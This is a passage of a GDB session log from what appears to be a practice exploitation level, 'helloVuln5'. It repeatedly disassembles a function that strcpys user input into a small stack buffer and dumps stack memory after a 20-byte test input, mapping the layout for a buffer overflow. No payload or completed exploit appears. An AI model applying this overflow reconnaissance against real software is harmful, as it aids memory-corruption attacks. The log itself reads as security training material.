   0x0804867d <+44>:    pushl  0x8(%ebp)
   0x08048680 <+47>:    call   0x80484b0 <strlen@plt>
   0x08048685 <+52>:    add    $0x10,%esp
   0x08048688 <+55>:    mov    %eax,%edx
   0x0804868a <+57>:    mov    -0xc(%ebp),%eax
   0x0804868d <+60>:    cmp    %eax,%edx
   0x0804868f <+62>:    jb     0x80486ab <vulnFunction+90>
   0x08048691 <+64>:    sub    $0xc,%esp
   0x08048694 <+67>:    push   $0x8048854
   0x08048699 <+72>:    call   0x8048470 <puts@plt>
   0x0804869e <+77>:    add    $0x10,%esp
   0x080486a1 <+80>:    sub    $0xc,%esp
   0x080486a4 <+83>:    push   $0x0
   0x080486a6 <+85>:    call   0x8048480 <exit@plt>
   0x080486ab <+90>:    sub    $0x8,%esp
   0x080486ae <+93>:    pushl  0x8(%ebp)
   0x080486b1 <+96>:    lea    -0x1c(%ebp),%eax
   0x080486b4 <+99>:    push   %eax
   0x080486b5 <+100>:   call   0x8048460 <strcpy@plt>
   0x080486ba <+105>:   add    $0x10,%esp
   0x080486bd <+108>:   sub    $0x8,%esp
   0x080486c0 <+111>:   lea    -0x1c(%ebp),%eax
   0x080486c3 <+114>:   push   %eax
   0x080486c4 <+115>:   push   $0x804887a
   0x080486c9 <+120>:   call   0x8048430 <printf@plt>
   0x080486ce <+125>:   add    $0x10,%esp
   0x080486d1 <+128>:   nop
   0x080486d2 <+129>:   leave  
   0x080486d3 <+130>:   ret    
End of assembler dump.
(gdb) break *0x08048652
Breakpoint 2 at 0x8048652
(gdb) r $(perl -e 'print "A"x20')
Starting program: /home/level2/Desktop/helloVuln5 $(perl -e 'print "A"x20')

Breakpoint 1, 0x08048736 in main ()
(gdb) info reg $eax
eax            0xbfbf9700       -1077963008
(gdb) x/16x $eax
0xbfbf9700:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfbf9710:     0x41414141      0x5f534c00      0x4f4c4f43      0x723d5352
0xbfbf9720:     0x3a303d73      0x303d6964      0x34333b31      0x3d6e6c3a
0xbfbf9730:     0x333b3130      0x686d3a36      0x3a30303d      0x343d6970
(gdb) Quit
(gdb) x/16x $eax
0xbfbf9700:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfbf9710:     0x41414141      0x5f534c00      0x4f4c4f43      0x723d5352
0xbfbf9720:     0x3a303d73      0x303d6964      0x34333b31      0x3d6e6c3a
0xbfbf9730:     0x333b3130      0x686d3a36      0x3a30303d      0x343d6970
(gdb) con
Ambiguous command "con": condition, continue.
(gdb) cont
Continuing.

Breakpoint 2, 0x08048652 in vulnFunction ()
(gdb) disass vulnFunction 
Dump of assembler code for function vulnFunction:
   0x08048651 <+0>:     push   %ebp
=> 0x08048652 <+1>:     mov    %esp,%ebp
   0x08048654 <+3>:     sub    $0x28,%esp
   0x08048657 <+6>:     movl   $0x0,-0x1c(%ebp)
   0x0804865e <+13>:    movl   $0x0,-0x18(%ebp)
   0x08048665 <+20>:    movl   $0x0,-0x14(%ebp)
   0x0804866c <+27>:    movl   $0x0,-0x10(%ebp)
   0x08048673 <+34>:    movl   $0x28,-0xc(%ebp)
   0x0804867a <+41>:    sub    $0xc,%esp
   0x0804867d <+44>:    pushl  0x8(%ebp)
   0x08048680 <+47>:    call   0x80484b0 <strlen@plt>
   0x08048685 <+52>:    add    $0x10,%esp
   0x08048688 <+55>:    mov    %eax,%edx
   0x0804868a <+57>:    mov    -0xc(%ebp),%eax
   0x0804868d <+60>:    cmp    %eax,%edx
   0x0804868f <+62>:    jb     0x80486ab <vulnFunction+90>
   0x08048691 <+64>:    sub    $0xc,%esp
   0x08048694 <+67>:    push   $0x8048854
   0x08048699 <+72>:    call   0x8048470 <puts@plt>
   0x0804869e <+77>:    add    $0x10,%esp
   0x080486a1 <+80>:    sub    $0xc,%esp
   0x080486a4 <+83>:    push   $0x0
   0x080486a6 <+85>:    call   0x8048480 <exit@plt>
   0x080486ab <+90>:    sub    $0x8,%esp
   0x080486ae <+93>:    pushl  0x8(%ebp)
   0x080486b1 <+96>:    lea    -0x1c(%ebp),%eax
   0x080486b4 <+99>:    push   %eax
   0x080486b5 <+100>:   call   0x8048460 <strcpy@plt>
   0x080486ba <+105>:   add    $0x10,%esp
   0x080486bd <+108>:   sub    $0x8,%esp
   0x080486c0 <+111>:   lea    -0x1c(%ebp),%eax
   0x080486c3 <+114>:   push   %eax
   0x080486c4 <+115>:   push   $0x804887a
   0x080486c9 <+120>:   call   0x8048430 <printf@plt>
   0x080486ce <+125>:   add    $0x10,%esp
   0x080486d1 <+128>:   nop
   0x080486d2 <+129>:   leave  
   0x080486d3 <+130>:   ret    
End of assembler dump.
(gdb) x/16x $ebx
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
(gdb) x/40x $ebx
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
0xbfbf85b0:     0x00000000      0xb7f7fe30      0xb7f7a9c0      0x0804a000
0xbfbf85c0:     0x00000002      0x080484e0      0x00000000      0x08048512
0xbfbf85d0:     0x080486d4      0x00000002      0xbfbf85f4      0x08048750
0xbfbf85e0:     0x080487b0      0xb7f7a9c0      0xbfbf85ec      0xb7f92940
0xbfbf85f0:     0x00000002      0xbfbf96e0      0xbfbf9700      0x00000000
(gdb) x/40x $ebp
0xbfbf8548:     0x00000000      0xb7d87f21      0xb7f47000      0xb7f47000
0xbfbf8558:     0x00000000      0xb7d87f21      0x00000002      0xbfbf85f4
0xbfbf8568:     0xbfbf8600      0xbfbf8584      0x00000001      0x00000000
0xbfbf8578:     0xb7f47000      0xb7f7a76a      0xb7f92000      0x00000000
0xbfbf8588:     0xb7f47000      0x00000000      0x00000000      0x75384b7b
0xbfbf8598:     0xbacf4d6b      0x00000000      0x00000000      0x00000000
0xbfbf85a8:     0x00000002      0x080484e0      0x00000000      0xb7f7fe30
0xbfbf85b8:     0xb7f7a9c0      0x0804a000      0x00000002      0x080484e0
0xbfbf85c8:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbfbf85d8:     0xbfbf85f4      0x08048750      0x080487b0      0xb7f7a9c0
(gdb) ni
0x08048654 in vulnFunction ()
(gdb) x/40x $ebp
0xbfbf8518:     0xbfbf8548      0x0804873b      0xbfbf9700      0x000003ee
0xbfbf8528:     0xbfbf8548      0x080486f4      0x00000002      0xbfbf85f4
0xbfbf8538:     0xbfbf8600      0x08048888      0xbfbf8560      0x00000000
0xbfbf8548:     0x00000000      0xb7d87f21      0xb7f47000      0xb7f47000
0xbfbf8558:     0x00000000      0xb7d87f21      0x00000002      0xbfbf85f4
0xbfbf8568:     0xbfbf8600      0xbfbf8584      0x00000001      0x00000000
0xbfbf8578:     0xb7f47000      0xb7f7a76a      0xb7f92000      0x00000000
0xbfbf8588:     0xb7f47000      0x00000000      0x00000000      0x75384b7b
0xbfbf8598:     0xbacf4d6b      0x00000000      0x00000000      0x00000000
0xbfbf85a8:     0x00000002      0x080484e0      0x00000000      0xb7f7fe30
(gdb) ni
0x08048657 in vulnFunction ()
(gdb) disass vulnFunction 
Dump of assembler code for function vulnFunction:
   0x08048651 <+0>:     push   %ebp
   0x08048652 <+1>:     mov    %esp,%ebp
   0x08048654 <+3>:     sub    $0x28,%esp
=> 0x08048657 <+6>:     movl   $0x0,-0x1c(%ebp)
   0x0804865e <+13>:    movl   $0x0,-0x18(%ebp)
   0x08048665 <+20>:    movl   $0x0,-0x14(%ebp)
   0x0804866c <+27>:    movl   $0x0,-0x10(%ebp)
   0x08048673 <+34>:    movl   $0x28,-0xc(%ebp)
   0x0804867a <+41>:    sub    $0xc,%esp
   0x0804867d <+44>:    pushl  0x8(%ebp)
   0x08048680 <+47>:    call   0x80484b0 <strlen@plt>
   0x08048685 <+52>:    add    $0x10,%esp
   0x08048688 <+55>:    mov    %eax,%edx
   0x0804868a <+57>:    mov    -0xc(%ebp),%eax
   0x0804868d <+60>:    cmp    %eax,%edx
   0x0804868f <+62>:    jb     0x80486ab <vulnFunction+90>
   0x08048691 <+64>:    sub    $0xc,%esp
   0x08048694 <+67>:    push   $0x8048854
   0x08048699 <+72>:    call   0x8048470 <puts@plt>
   0x0804869e <+77>:    add    $0x10,%esp
   0x080486a1 <+80>:    sub    $0xc,%esp
   0x080486a4 <+83>:    push   $0x0
   0x080486a6 <+85>:    call   0x8048480 <exit@plt>
   0x080486ab <+90>:    sub    $0x8,%esp
   0x080486ae <+93>:    pushl  0x8(%ebp)
   0x080486b1 <+96>:    lea    -0x1c(%ebp),%eax
   0x080486b4 <+99>:    push   %eax
   0x080486b5 <+100>:   call   0x8048460 <strcpy@plt>
   0x080486ba <+105>:   add    $0x10,%esp
   0x080486bd <+108>:   sub    $0x8,%esp
   0x080486c0 <+111>:   lea    -0x1c(%ebp),%eax
   0x080486c3 <+114>:   push   %eax
   0x080486c4 <+115>:   push   $0x804887a
   0x080486c9 <+120>:   call   0x8048430 <printf@plt>
   0x080486ce <+125>:   add    $0x10,%esp
   0x080486d1 <+128>:   nop
   0x080486d2 <+129>:   leave  
   0x080486d3 <+130>:   ret    
End of assembler dump.
(gdb) x/40x $ebp
0xbfbf8518:     0xbfbf8548      0x0804873b      0xbfbf9700      0x000003ee
0xbfbf8528:     0xbfbf8548      0x080486f4      0x00000002      0xbfbf85f4
0xbfbf8538:     0xbfbf8600      0x08048888      0xbfbf8560      0x00000000
0xbfbf8548:     0x00000000      0xb7d87f21      0xb7f47000      0xb7f47000
0xbfbf8558:     0x00000000      0xb7d87f21      0x00000002      0xbfbf85f4
0xbfbf8568:     0xbfbf8600      0xbfbf8584      0x00000001      0x00000000
0xbfbf8578:     0xb7f47000      0xb7f7a76a      0xb7f92000      0x00000000
0xbfbf8588:     0xb7f47000      0x00000000      0x00000000      0x75384b7b
0xbfbf8598:     0xbacf4d6b      0x00000000      0x00000000      0x00000000
0xbfbf85a8:     0x00000002      0x080484e0      0x00000000      0xb7f7fe30
(gdb) x/40x $ebp - 8
0xbfbf8510:     0x00000000      0xb7e5fb66      0xbfbf8548      0x0804873b
0xbfbf8520:     0xbfbf9700      0x000003ee      0xbfbf8548      0x080486f4
0xbfbf8530:     0x00000002      0xbfbf85f4      0xbfbf8600      0x08048888
0xbfbf8540:     0xbfbf8560      0x00000000      0x00000000      0xb7d87f21
0xbfbf8550:     0xb7f47000      0xb7f47000      0x00000000      0xb7d87f21
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
(gdb) x/60x $ebp - 8
0xbfbf8510:     0x00000000      0xb7e5fb66      0xbfbf8548      0x0804873b
0xbfbf8520:     0xbfbf9700      0x000003ee      0xbfbf8548      0x080486f4
0xbfbf8530:     0x00000002      0xbfbf85f4      0xbfbf8600      0x08048888
0xbfbf8540:     0xbfbf8560      0x00000000      0x00000000      0xb7d87f21
0xbfbf8550:     0xb7f47000      0xb7f47000      0x00000000      0xb7d87f21
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
0xbfbf85b0:     0x00000000      0xb7f7fe30      0xb7f7a9c0      0x0804a000
0xbfbf85c0:     0x00000002      0x080484e0      0x00000000      0x08048512
0xbfbf85d0:     0x080486d4      0x00000002      0xbfbf85f4      0x08048750
0xbfbf85e0:     0x080487b0      0xb7f7a9c0      0xbfbf85ec      0xb7f92940
0xbfbf85f0:     0x00000002      0xbfbf96e0      0xbfbf9700      0x00000000
(gdb) x/60x $ebp - 24
0xbfbf8500:     0xbfbf8548      0xb7f7fe30      0xfffff858      0xebb76d00
0xbfbf8510:     0x00000000      0xb7e5fb66      0xbfbf8548      0x0804873b
0xbfbf8520:     0xbfbf9700      0x000003ee      0xbfbf8548      0x080486f4
0xbfbf8530:     0x00000002      0xbfbf85f4      0xbfbf8600      0x08048888
0xbfbf8540:     0xbfbf8560      0x00000000      0x00000000      0xb7d87f21
0xbfbf8550:     0xb7f47000      0xb7f47000      0x00000000      0xb7d87f21
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
0xbfbf85b0:     0x00000000      0xb7f7fe30      0xb7f7a9c0      0x0804a000
0xbfbf85c0:     0x00000002      0x080484e0      0x00000000      0x08048512
0xbfbf85d0:     0x080486d4      0x00000002      0xbfbf85f4      0x08048750
0xbfbf85e0:     0x080487b0      0xb7f7a9c0      0xbfbf85ec      0xb7f92940
(gdb) x/60x $ebp - 8
0xbfbf8510:     0x00000000      0xb7e5fb66      0xbfbf8548      0x0804873b
0xbfbf8520:     0xbfbf9700      0x000003ee      0xbfbf8548      0x080486f4
0xbfbf8530:     0x00000002      0xbfbf85f4      0xbfbf8600      0x08048888
0xbfbf8540:     0xbfbf8560      0x00000000      0x00000000      0xb7d87f21
0xbfbf8550:     0xb7f47000      0xb7f47000      0x00000000      0xb7d87f21
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
0xbfbf85b0:     0x00000000      0xb7f7fe30      0xb7f7a9c0      0x0804a000
0xbfbf85c0:     0x00000002      0x080484e0      0x00000000      0x08048512
0xbfbf85d0:     0x080486d4      0x00000002      0xbfbf85f4      0x08048750
0xbfbf85e0:     0x080487b0      0xb7f7a9c0      0xbfbf85ec      0xb7f92940
0xbfbf85f0:     0x00000002      0xbfbf96e0      0xbfbf9700      0x00000000
(gdb) ni
0x0804865e in vulnFunction ()
(gdb) ni
0x08048665 in vulnFunction ()
(gdb) ni
0x0804866c in vulnFunction ()
(gdb) ni
0x08048673 in vulnFunction ()
(gdb) disassemble vulnFunction 
Dump of assembler code for function vulnFunction:
   0x08048651 <+0>:     push   %ebp
   0x08048652 <+1>:     mov    %esp,%ebp
   0x08048654 <+3>:     sub    $0x28,%esp
   0x08048657 <+6>:     movl   $0x0,-0x1c(%ebp)
   0x0804865e <+13>:    movl   $0x0,-0x18(%ebp)
   0x08048665 <+20>:    movl   $0x0,-0x14(%ebp)
   0x0804866c <+27>:    movl   $0x0,-0x10(%ebp)
=> 0x08048673 <+34>:    movl   $0x28,-0xc(%ebp)
   0x0804867a <+41>:    sub    $0xc,%esp
   0x0804867d <+44>:    pushl  0x8(%ebp)
   0x08048680 <+47>:    call   0x80484b0 <strlen@plt>
   0x08048685 <+52>:    add    $0x10,%esp
   0x08048688 <+55>:    mov    %eax,%edx
   0x0804868a <+57>:    mov    -0xc(%ebp),%eax
   0x0804868d <+60>:    cmp    %eax,%edx
   0x0804868f <+62>:    jb     0x80486ab <vulnFunction+90>
   0x08048691 <+64>:    sub    $0xc,%esp
   0x08048694 <+67>:    push   $0x8048854
   0x08048699 <+72>:    call   0x8048470 <puts@plt>
   0x0804869e <+77>:    add    $0x10,%esp
   0x080486a1 <+80>:    sub    $0xc,%esp
   0x080486a4 <+83>:    push   $0x0
   0x080486a6 <+85>:    call   0x8048480 <exit@plt>
   0x080486ab <+90>:    sub    $0x8,%esp
   0x080486ae <+93>:    pushl  0x8(%ebp)
   0x080486b1 <+96>:    lea    -0x1c(%ebp),%eax
   0x080486b4 <+99>:    push   %eax
   0x080486b5 <+100>:   call   0x8048460 <strcpy@plt>
   0x080486ba <+105>:   add    $0x10,%esp
   0x080486bd <+108>:   sub    $0x8,%esp
   0x080486c0 <+111>:   lea    -0x1c(%ebp),%eax
   0x080486c3 <+114>:   push   %eax
   0x080486c4 <+115>:   push   $0x804887a
   0x080486c9 <+120>:   call   0x8048430 <printf@plt>
   0x080486ce <+125>:   add    $0x10,%esp
   0x080486d1 <+128>:   nop
   0x080486d2 <+129>:   leave  
   0x080486d3 <+130>:   ret    
End of assembler dump.
(gdb) ni
0x0804867a in vulnFunction ()
(gdb) ni
0x0804867d in vulnFunction ()
(gdb) disassemble vulnFunction 
Dump of assembler code for function vulnFunction:
   0x08048651 <+0>:     push   %ebp
   0x08048652 <+1>:     mov    %esp,%ebp
   0x08048654 <+3>:     sub    $0x28,%esp
   0x08048657 <+6>:     movl   $0x0,-0x1c(%ebp)
   0x0804865e <+13>:    movl   $0x0,-0x18(%ebp)
   0x08048665 <+20>:    movl   $0x0,-0x14(%ebp)
   0x0804866c <+27>:    movl   $0x0,-0x10(%ebp)
   0x08048673 <+34>:    movl   $0x28,-0xc(%ebp)
   0x0804867a <+41>:    sub    $0xc,%esp
=> 0x0804867d <+44>:    pushl  0x8(%ebp)
   0x08048680 <+47>:    call   0x80484b0 <strlen@plt>
   0x08048685 <+52>:    add    $0x10,%esp
   0x08048688 <+55>:    mov    %eax,%edx
   0x0804868a <+57>:    mov    -0xc(%ebp),%eax
   0x0804868d <+60>:    cmp    %eax,%edx
   0x0804868f <+62>:    jb     0x80486ab <vulnFunction+90>
   0x08048691 <+64>:    sub    $0xc,%esp
   0x08048694 <+67>:    push   $0x8048854
   0x08048699 <+72>:    call   0x8048470 <puts@plt>
   0x0804869e <+77>:    add    $0x10,%esp
   0x080486a1 <+80>:    sub    $0xc,%esp
   0x080486a4 <+83>:    push   $0x0
   0x080486a6 <+85>:    call   0x8048480 <exit@plt>
   0x080486ab <+90>:    sub    $0x8,%esp
   0x080486ae <+93>:    pushl  0x8(%ebp)
   0x080486b1 <+96>:    lea    -0x1c(%ebp),%eax
   0x080486b4 <+99>:    push   %eax
   0x080486b5 <+100>:   call   0x8048460 <strcpy@plt>
   0x080486ba <+105>:   add    $0x10,%esp
   0x080486bd <+108>:   sub    $0x8,%esp
   0x080486c0 <+111>:   lea    -0x1c(%ebp),%eax
   0x080486c3 <+114>:   push   %eax
   0x080486c4 <+115>:   push   $0x804887a
   0x080486c9 <+120>:   call   0x8048430 <printf@plt>
   0x080486ce <+125>:   add    $0x10,%esp
   0x080486d1 <+128>:   nop
   0x080486d2 <+129>:   leave  
   0x080486d3 <+130>:   ret    
End of assembler dump.
(gdb) x/60x $ebp - 8
0xbfbf8510:     0x00000000      0xb7e5fb66      0xbfbf8548      0x0804873b
0xbfbf8520:     0xbfbf9700      0x000003ee      0xbfbf8548      0x080486f4
0xbfbf8530:     0x00000002      0xbfbf85f4      0xbfbf8600      0x08048888
0xbfbf8540:     0xbfbf8560      0x00000000      0x00000000      0xb7d87f21
0xbfbf8550:     0xb7f47000      0xb7f47000      0x00000000      0xb7d87f21
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
0xbfbf85b0:     0x00000000      0xb7f7fe30      0xb7f7a9c0      0x0804a000
0xbfbf85c0:     0x00000002      0x080484e0      0x00000000      0x08048512
0xbfbf85d0:     0x080486d4      0x00000002      0xbfbf85f4      0x08048750
0xbfbf85e0:     0x080487b0      0xb7f7a9c0      0xbfbf85ec      0xb7f92940
0xbfbf85f0:     0x00000002      0xbfbf96e0      0xbfbf9700      0x00000000
(gdb) x/60x $ebp - 24
0xbfbf8500:     0x00000000      0x00000000      0x00000000      0x00000028
0xbfbf8510:     0x00000000      0xb7e5fb66      0xbfbf8548      0x0804873b
0xbfbf8520:     0xbfbf9700      0x000003ee      0xbfbf8548      0x080486f4
0xbfbf8530:     0x00000002      0xbfbf85f4      0xbfbf8600      0x08048888
0xbfbf8540:     0xbfbf8560      0x00000000      0x00000000      0xb7d87f21
0xbfbf8550:     0xb7f47000      0xb7f47000      0x00000000      0xb7d87f21
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
0xbfbf85b0:     0x00000000      0xb7f7fe30      0xb7f7a9c0      0x0804a000
0xbfbf85c0:     0x00000002      0x080484e0      0x00000000      0x08048512
0xbfbf85d0:     0x080486d4      0x00000002      0xbfbf85f4      0x08048750
0xbfbf85e0:     0x080487b0      0xb7f7a9c0      0xbfbf85ec      0xb7f92940
(gdb) x/60x $ebp - 32
0xbfbf84f8:     0xb7f47000      0x00000000      0x00000000      0x00000000
0xbfbf8508:     0x00000000      0x00000028      0x00000000      0xb7e5fb66
0xbfbf8518:     0xbfbf8548      0x0804873b      0xbfbf9700      0x000003ee
0xbfbf8528:     0xbfbf8548      0x080486f4      0x00000002      0xbfbf85f4
0xbfbf8538:     0xbfbf8600      0x08048888      0xbfbf8560      0x00000000
0xbfbf8548:     0x00000000      0xb7d87f21      0xb7f47000      0xb7f47000
0xbfbf8558:     0x00000000      0xb7d87f21      0x00000002      0xbfbf85f4
0xbfbf8568:     0xbfbf8600      0xbfbf8584      0x00000001      0x00000000
0xbfbf8578:     0xb7f47000      0xb7f7a76a      0xb7f92000      0x00000000
0xbfbf8588:     0xb7f47000      0x00000000      0x00000000      0x75384b7b
0xbfbf8598:     0xbacf4d6b      0x00000000      0x00000000      0x00000000
0xbfbf85a8:     0x00000002      0x080484e0      0x00000000      0xb7f7fe30
0xbfbf85b8:     0xb7f7a9c0      0x0804a000      0x00000002      0x080484e0
0xbfbf85c8:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbfbf85d8:     0xbfbf85f4      0x08048750      0x080487b0      0xb7f7a9c0
(gdb) x/60x $ebp - 30
0xbfbf84fa:     0x0000b7f4      0x00000000      0x00000000      0x00000000
0xbfbf850a:     0x00280000      0x00000000      0xfb660000      0x8548b7e5
0xbfbf851a:     0x873bbfbf      0x97000804      0x03eebfbf      0x85480000
0xbfbf852a:     0x86f4bfbf      0x00020804      0x85f40000      0x8600bfbf
0xbfbf853a:     0x8888bfbf      0x85600804      0x0000bfbf      0x00000000
0xbfbf854a:     0x7f210000      0x7000b7d8      0x7000b7f4      0x0000b7f4
0xbfbf855a:     0x7f210000      0x0002b7d8      0x85f40000      0x8600bfbf
0xbfbf856a:     0x8584bfbf      0x0001bfbf      0x00000000      0x70000000
0xbfbf857a:     0xa76ab7f4      0x2000b7f7      0x0000b7f9      0x70000000
0xbfbf858a:     0x0000b7f4      0x00000000      0x4b7b0000      0x4d6b7538
0xbfbf859a:     0x0000bacf      0x00000000      0x00000000      0x00020000
0xbfbf85aa:     0x84e00000      0x00000804      0xfe300000      0xa9c0b7f7
0xbfbf85ba:     0xa000b7f7      0x00020804      0x84e00000      0x00000804
0xbfbf85ca:     0x85120000      0x86d40804      0x00020804      0x85f40000
0xbfbf85da:     0x8750bfbf      0x87b00804      0xa9c00804      0x85ecb7f7
(gdb) x/60x $ebp - 28
0xbfbf84fc:     0x00000000      0x00000000      0x00000000      0x00000000
0xbfbf850c:     0x00000028      0x00000000      0xb7e5fb66      0xbfbf8548
0xbfbf851c:     0x0804873b      0xbfbf9700      0x000003ee      0xbfbf8548
0xbfbf852c:     0x080486f4      0x00000002      0xbfbf85f4      0xbfbf8600
0xbfbf853c:     0x08048888      0xbfbf8560      0x00000000      0x00000000
0xbfbf854c:     0xb7d87f21      0xb7f47000      0xb7f47000      0x00000000
0xbfbf855c:     0xb7d87f21      0x00000002      0xbfbf85f4      0xbfbf8600
0xbfbf856c:     0xbfbf8584      0x00000001      0x00000000      0xb7f47000
0xbfbf857c:     0xb7f7a76a      0xb7f92000      0x00000000      0xb7f47000
0xbfbf858c:     0x00000000      0x00000000      0x75384b7b      0xbacf4d6b
0xbfbf859c:     0x00000000      0x00000000      0x00000000      0x00000002
0xbfbf85ac:     0x080484e0      0x00000000      0xb7f7fe30      0xb7f7a9c0
0xbfbf85bc:     0x0804a000      0x00000002      0x080484e0      0x00000000
0xbfbf85cc:     0x08048512      0x080486d4      0x00000002      0xbfbf85f4
0xbfbf85dc:     0x08048750      0x080487b0      0xb7f7a9c0      0xbfbf85ec
(gdb) x/60x $ebp - 29
0xbfbf84fb:     0x000000b7      0x00000000      0x00000000      0x00000000
0xbfbf850b:     0x00002800      0x00000000      0xe5fb6600      0xbf8548b7
0xbfbf851b:     0x04873bbf      0xbf970008      0x0003eebf      0xbf854800
0xbfbf852b:     0x0486f4bf      0x00000208      0xbf85f400      0xbf8600bf
0xbfbf853b:     0x048888bf      0xbf856008      0x000000bf      0x00000000
0xbfbf854b:     0xd87f2100      0xf47000b7      0xf47000b7      0x000000b7
0xbfbf855b:     0xd87f2100      0x000002b7      0xbf85f400      0xbf8600bf
0xbfbf856b:     0xbf8584bf      0x000001bf      0x00000000      0xf4700000
0xbfbf857b:     0xf7a76ab7      0xf92000b7      0x000000b7      0xf4700000
0xbfbf858b:     0x000000b7      0x00000000      0x384b7b00      0xcf4d6b75
0xbfbf859b:     0x000000ba      0x00000000      0x00000000      0x00000200
0xbfbf85ab:     0x0484e000      0x00000008      0xf7fe3000      0xf7a9c0b7
0xbfbf85bb:     0x04a000b7      0x00000208      0x0484e000      0x00000008
0xbfbf85cb:     0x04851200      0x0486d408      0x00000208      0xbf85f400
0xbfbf85db:     0x048750bf      0x0487b008      0xf7a9c008      0xbf85ecb7
(gdb) x/60x $ebp - 30
0xbfbf84fa:     0x0000b7f4      0x00000000      0x00000000      0x00000000
0xbfbf850a:     0x00280000      0x00000000      0xfb660000      0x8548b7e5
0xbfbf851a:     0x873bbfbf      0x97000804      0x03eebfbf      0x85480000
0xbfbf852a:     0x86f4bfbf      0x00020804      0x85f40000      0x8600bfbf
0xbfbf853a:     0x8888bfbf      0x85600804      0x0000bfbf      0x00000000
0xbfbf854a:     0x7f210000      0x7000b7d8      0x7000b7f4      0x0000b7f4
0xbfbf855a:     0x7f210000      0x0002b7d8      0x85f40000      0x8600bfbf
0xbfbf856a:     0x8584bfbf      0x0001bfbf      0x00000000      0x70000000
0xbfbf857a:     0xa76ab7f4      0x2000b7f7      0x0000b7f9      0x70000000
0xbfbf858a:     0x0000b7f4      0x00000000      0x4b7b0000      0x4d6b7538
0xbfbf859a:     0x0000bacf      0x00000000      0x00000000      0x00020000
0xbfbf85aa:     0x84e00000      0x00000804      0xfe300000      0xa9c0b7f7
0xbfbf85ba:     0xa000b7f7      0x00020804      0x84e00000      0x00000804
0xbfbf85ca:     0x85120000      0x86d40804      0x00020804      0x85f40000
0xbfbf85da:     0x8750bfbf      0x87b00804      0xa9c00804      0x85ecb7f7
(gdb) x/60x $ebp - 8
0xbfbf8510:     0x00000000      0xb7e5fb66      0xbfbf8548      0x0804873b
0xbfbf8520:     0xbfbf9700      0x000003ee      0xbfbf8548      0x080486f4
0xbfbf8530:     0x00000002      0xbfbf85f4      0xbfbf8600      0x08048888
0xbfbf8540:     0xbfbf8560      0x00000000      0x00000000      0xb7d87f21
0xbfbf8550:     0xb7f47000      0xb7f47000      0x00000000      0xb7d87f21
0xbfbf8560:     0x00000002      0xbfbf85f4      0xbfbf8600      0xbfbf8584
0xbfbf8570:     0x00000001      0x00000000      0xb7f47000      0xb7f7a76a
0xbfbf8580:     0xb7f92000      0x00000000      0xb7f47000      0x00000000
0xbfbf8590:     0x00000000      0x75384b7b      0xbacf4d6b      0x00000000
0xbfbf85a0:     0x00000000      0x00000000      0x00000002      0x080484e0
0xbfbf85b0:     0x00000000      0xb7f7fe30      0xb7f7a9c0      0x0804a000
0xbfbf85c0:     0x00000002      0x080484e0      0x00000000      0x08048512
0xbfbf85d0:     0x080486d4      0x00000002      0xbfbf85f4      0x08048750
0xbfbf85e0:     0x080487b0      0xb7f7a9c0      0xbfbf85ec      0xb7f92940
0xbfbf85f0:     0x00000002      0xbfbf96e0      0xbfbf9700      0x00000000
(gdb) x/60x $ebp - 12
0xbfbf850c:     0x00000028      0x00000000      0xb7e5fb66      0xbfbf8548
0xbfbf851c:     0x0804873b      0xbfbf9700      0x000003ee      0xbfbf8548
0xbfbf852c:     0x080486f4      0x00000002      0xbfbf85f4      0xbfbf8600
0xbfbf853c:     0x08048888      0xbfbf8560      0x00000000      0x00000000
